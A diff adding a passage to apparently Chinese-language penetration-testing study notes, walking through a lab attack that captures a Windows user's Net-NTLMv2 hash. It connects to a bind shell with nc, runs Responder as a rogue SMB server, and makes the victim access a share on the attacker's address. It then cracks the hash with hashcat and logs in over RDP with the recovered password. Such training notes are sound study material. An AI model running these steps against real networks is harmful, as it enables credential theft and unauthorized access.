@@ -4300,3 +4300,199 @@ VM2\administrator
 ```
 
 ### Cracking Net-NTLMv2
+如果在 windows 上以 unprivileged user 取得 code execution 或 shell，代表我們不能使用 Mimikatz 等工具來提取密碼或 NTLM hash。\
+那我們可以嘗試 [Net-NTLMv2](#Working-with-Password-Hashes) network authentication protocol 
+
+範例目標: 透過 Net-NTLMv2 從 Windows 11 用戶端存取 Windows 2022 Server 上的 SMB share
+> 雖然 [Kerberos](https://en.wikipedia.org/wiki/Kerberos_(protocol)) protocol 較安全，但現今大多數的 Windows environments 還是以 Net-NTLMv2 為主。\
+
+[Responder](https://github.com/lgandx/Responder) tool 主要用於攔截 NTLM 認證流量並擷取 Net-NTLMv2 Hash。內建 SMB server，可處理身份驗證過程並列印所有抓取的 Net-NTLMv2 Hash。\
+Responder 也支援其他協議 (例如 HTTP、FTP) 以及 [Link-Local Multicast Name Resolution](https://en.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution)(LLMNR)、[NetBIOS Name Service](https://en.wikipedia.org/wiki/NetBIOS)(NBT-NS)、[Multicast_DNS](https://en.wikipedia.org/wiki/Multicast_DNS)(MDNS) 等名稱解析攻擊，這類攻擊在 MITRE ATT&CK 架構中被歸類為 [T1557](https://attack.mitre.org/techniques/T1557/001/)。
+
+#### 1. 連接 Bind Shell，確認 user 權限
+範例假設： 我們在 Kali 上將 Responder 設定為 SMB Server，並使用 VM11（位於 192.168.111.211）作為目標\
+且 Window 已執行了一個 Bind Shell 監聽 4444 port
+>[!Note]
+> **Bind Shell vs. Reverse Shell**\
+> Reverse Shell 比 Bind Shell 更常用，因為企業內網通常有防火牆
+
+方式 | 目標機器 | 攻擊者行為 | 連線方式 |
+:------:|:---------------------|:---------------------|:---------------------|
+Bind Shell | 目標機器開一個監聽端口（如 4444）| 攻擊者直接連線 `nc <IP> 4444` | 目標機器被動等待
+Reverse Shell | 目標機器主動連回攻擊者（如 8888）| 攻擊者監聽 `nc -lvp 8888` | 目標機器主動發送
+
+```
+┌──(chw㉿CHW)-[~]
+└─$ nc 192.168.111.211 4444
+Microsoft Windows [Version 10.0.20348.707]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+VM01\paul
+
+C:\Windows\system32>net user paul
+net user paul
+User name                    paul
+Full Name                    paul power
+Comment                      
+User's comment               
+Country/region code          000 (System Default)
+...
+
+Workstations allowed         All
+Logon script                 
+User profile                 
+Home directory               
+Last logon                   2/15/2025 6:03:49 AM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Desktop Users *Users                
+Global Group memberships     *None                 
+The command completed successfully.
+
+```
+> 使用者是 `VM01\paul`\
+> 確認 paul 的權限: Remote Desktop Users *Users
+>> 不是 local administrator > 不能執行 Mimikatz (上面方法無效)
+
+#### 2. 建立 Responder SMB server，讓目標回傳驗證
+因此透過 Kali上 Responder 內建的 SMB server， 再以 user paul 的身份連接到 Responder 破解身份驗證過程中使用的 Net-NTLMv2 雜湊。
+```
+┌──(chw㉿CHW)-[~]
+└─$ sudo apt update
+sudo apt install responder -y
+┌──(chw㉿CHW)-[~]
+└─$ ip a 
+...
+3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
+    link/none 
+    inet 192.168.45.225/24 scope global tun0
+       valid_lft forever preferred_lft forever
+    inet6 fe80::5:3781:23d8:7961/64 scope link stable-privacy proto kernel_ll 
+       valid_lft forever preferred_lft forever
+            
+┌──(chw㉿CHW)-[~]
+└─$ sudo responder -I tun0
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.1.5.0
+
+  To support this project:
+  Github -> https://github.com/sponsors/lgandx
+  Paypal  -> https://paypal.me/PythonResponder
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    MDNS                       [ON]
+    DNS                        [ON]
+    DHCP                       [OFF]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [OFF]
+    Auth proxy                 [OFF]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    ...
+    
+[+] Generic Options:
+    Responder NIC              [tun0]
+    Responder IP               [192.168.45.225]
+    Responder IPv6             [fe80::5:3781:23d8:7961]
+    Challenge set              [random]
+    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
+    Don't Respond To MDNS TLD  ['_DOSVC']
+    TTL for poisoned response  [default]
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-7004QFW84VE]
+    Responder Domain Name      [GQH5.LOCAL]
+    Responder DCE-RPC Port     [49724]
+
+[+] Listening for events...                  
+```
+> 1. 查看 interface
+> 2. 在對應 interface 執行responder，`-I`:設定監聽接口
+
+#### 3. 接收 Net-NTLMv2 Hash 進行爆破
+接著使用 paul 的 bind shell 存取剛剛建立的 Responder SMB 伺服器**不存在**的 SMB share。
+```
+┌──(chw㉿CHW)-[~]
+└─$ nc 192.168.111.211 4444
+Microsoft Windows [Version 10.0.20348.707]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>dir \\192.168.45.225\chw41      
+dir \\192.168.45.225\chw41
+Access is denied.
+```
+(Responder tab): 接收到 paul的 Net-NTLMv2 Hash 驗證
+```
+[+] Listening for events...                        
+
+[SMB] NTLMv2-SSP Client   : 192.168.111.211
+[SMB] NTLMv2-SSP Username : VM01\paul
+[SMB] NTLMv2-SSP Hash     : paul::VM01:e3c92a6bbe6ed8c8:39296C8175A54130C27F9202B7245048:01010000000000008072E0608D7FDB01C69859215550C7C70000000002000800470051004800350001001E00570049004E002D003700300030003400510046005700380034005600450004003400570049004E002D00370030003000340051004600570038003400560045002E0047005100480035002E004C004F00430041004C000300140047005100480035002E004C004F00430041004C000500140047005100480035002E004C004F00430041004C00070008008072E0608D7FDB0106000400020000000800300030000000000000000000000000200000A8E932A27C367609FAA7B737747C9AC8F71288A00702213E4175617603B18BC30A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200320035000000000000000000 
+```
+將 Net-NTLMv2 Hash 存成 paul.hash 進行爆破
+
+```
+┌──(chw㉿CHW)-[~]
+└─$ cat paul.hash 
+paul::VM01:e3c92a6bbe6ed8c8:39296C8175A54130C27F9202B7245048:01010000000000008072E0608D7FDB01C69859215550C7C70000000002000800470051004800350001001E00570049004E002D003700300030003400510046005700380034005600450004003400570049004E002D00370030003000340051004600570038003400560045002E...                                                             
+┌──(chw㉿CHW)-[~]
+└─$ hashcat --help | grep -i "ntlm"
+   5500 | NetNTLMv1 / NetNTLMv1+ESS                                  | Network Protocol
+  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                             | Network Protocol
+   5600 | NetNTLMv2                                                  | Network Protocol
+  27100 | NetNTLMv2 (NT)                                             | Network Protocol
+   1000 | NTLM                                                       | Operating System
+```
+> mode 5600 ("NetNTLMv2")
+
+Hashcat 爆破
+```
+┌──(chw㉿CHW)-[~]
+└─$ hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
+hashcat (v6.2.6) starting
+
+You have enabled --force to bypass dangerous warnings and errors!
+This can hide serious problems and should only be done when debugging.
+Do not report hashcat issues encountered when using --force.
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
+====================================================================================================================================
+* Device #1: cpu--0x000, 1437/2939 MB (512 MB allocatable), 3MCU
+...
+
+PAUL::FILES01:e3c92a6bbe6ed8c8:39296c8175a54130c27f9202b7245048:01010000000000008072e0608d7fdb01c69859215550c7c70000000002000800470051004800350001001e00570049004e002d003700300030003400510046005700380034005600450004003400570049004e002d00370030003000340051004600570038003400560045002e0047005100480035002e004c004f00430041004c000300140047005100480035002e004c004f00430041004c000500140047005100480035002e004c004f00430041004c00070008008072e0608d7fdb0106000400020000000800300030000000000000000000000000200000a8e932a27c367609faa7b737747c9ac8f71288a00702213e4175617603b18bc30a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340035002e003200320035000000000000000000:123Password123
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 5600 (NetNTLMv2)
+Hash.Target......: PAUL::FILES01:e3c92a6bbe6ed8c8:39296c8175a54130c27f9202b7245048:01010000000000008072e0608d7fdb01c69859215550c7c70000000002000800470051004800350001001e00570049004e002d003700300030003400510046005700380034005600450004003400570049004e002d00370030003000340051004600570038003400560045002e0047005100480035002e004c004f00430041004c000300140047005100480035002e004c004f00430041004c000500140047005100480035002e004c004f00430041004c00070008008072e0608d7fdb0106000400020000000800300030000000000000000000000000200000a8e932a27c367609faa7b737747c9ac8f71288a00702213e4175617603b18bc30a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340035002e003200320035000000000000000000:123Password123
+...
+```
+> 123Password123
+
+#### 4.取得爆破密碼，登入 RDP 驗證
+```
+┌──(chw㉿CHW)-[~]
+└─$ xfreerdp /u:paul /p:123Password123 /v:192.168.111.211
+```
+![image](https://hackmd.io/_uploads/rJ5Uqm0Y1x.png)
+
+### Relaying Net-NTLMv2
